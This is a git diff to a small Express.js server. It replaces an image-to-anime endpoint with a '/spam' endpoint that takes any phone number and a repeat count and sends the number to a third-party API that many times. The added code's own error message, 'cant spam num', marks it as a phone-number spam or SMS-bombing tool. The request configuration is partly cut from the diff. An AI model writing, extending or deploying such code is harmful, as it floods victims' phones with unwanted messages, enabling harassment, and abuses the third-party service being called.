@@ -1,14 +1,21 @@
 const express = require("express");
-const { toanime } = require('betabotz-tools');
+const axios = require("axios");
 const app = express();
 const PORT = process.env.PORT || 3000;
-/*
-
-const axios = require("axios");
-(async () => {
-    
-let data = JSON.stringify({
-  "msisdn": "7878580841"
+app.get( "/", ( req, res ) => {
+    res.send("hi im run in cpu 4 hhhh");
+})
+app.get( "/spam",async ( req, res ) => {
+    const num = req.query.num;
+    const hh = req.query.hh;
+    if(!num || !hh) {
+        return res.status(403).json({
+            status: 403
+        })
+    }
+    try {
+   let data = JSON.stringify({
+  "msisdn": num
 });
 
 let config = {
@@ -28,28 +35,15 @@ let config = {
   },
   data: data
 };
-for(i=0; i<3; ++i) {
+        let arr = [];
+for(i=0; i<hh; ++i) {
  let x = await axios.request(config);
- console.log(i+1+" ¦ Done: "+x.data.status)
+ arr.push(`${i+1} ¦ Done: ${x.data.status}`);
   }
-})();
-*/
-app.get( "/", ( req, res ) => {
-    res.send("hi im run in cpu 4 hhhh");
-})
-app.get( "/toanime",async ( req, res ) => {
-    const url = req.query.url;
-    if(!url) {
-        return res.status(403).json({
-            status: 403
-        })
-    }
-    try {
-    const results = await toanime(url)
-    res.json(results)
+    res.json(arr)
     } catch (e) {
         res.status(500).json({
-            err: "cant convert image"
+            err: "cant spam num"
         })
     }
 })
